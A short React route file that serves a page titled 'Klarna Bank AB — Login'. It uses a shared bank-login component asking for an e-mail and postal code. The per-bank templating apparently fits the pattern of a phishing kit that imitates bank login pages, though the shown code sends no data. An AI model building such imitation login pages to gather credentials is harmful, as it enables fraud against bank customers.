import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/klarna-bank")({
  head: () => ({ meta: [{ title: "Klarna Bank AB — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="klarna" logoSlug="klarna-bank" title="Klarna Bank AB" field1Label="E-Mail" field2Label="Postleitzahl" field2Type="text" />
  ),
});
